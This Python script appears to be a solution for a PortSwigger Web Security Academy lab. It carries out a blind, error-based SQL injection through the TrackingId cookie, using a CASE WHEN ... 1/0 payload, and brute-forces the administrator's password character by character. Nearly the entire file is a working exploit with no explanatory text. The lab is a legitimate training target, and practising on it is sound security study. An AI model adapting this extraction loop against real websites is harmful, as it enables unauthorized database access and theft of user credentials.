import requests

url = 'https://0a6800e40402e80481628e0d00c3004d.web-security-academy.net/'
headers = {
    'Host': '0a6800e40402e80481628e0d00c3004d.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://portswigger.net/',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers',
    'Connection': 'close'
}

a = 'abcdefghijklmnopqrstuvwxyz0123456789'
counter = 1
password = ""

for c in range(0, 20):
    for i in a:
        cookies = {
            'TrackingId': f"Hks84boUqauYCD6c' AND 1 = (SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password,{counter},1) = '{i}') THEN 1 ELSE 1/0 END FROM Users WHERE ROWNUM = 1) --",
            'session': 'oWCh7G6O34DPQJ3A10eVs0ZOXhb6pDEb'
        }

        response = requests.get(url, headers=headers, cookies=cookies)
        if response.status_code == 200:
            password += i
            counter += 1
            print(f"Found {i} character, password so far: {password}")
            break  # Exit the inner loop and continue with the next character
        else:
            print(f"Tried {i} character, no match.")

print(f"Final password: {password}")
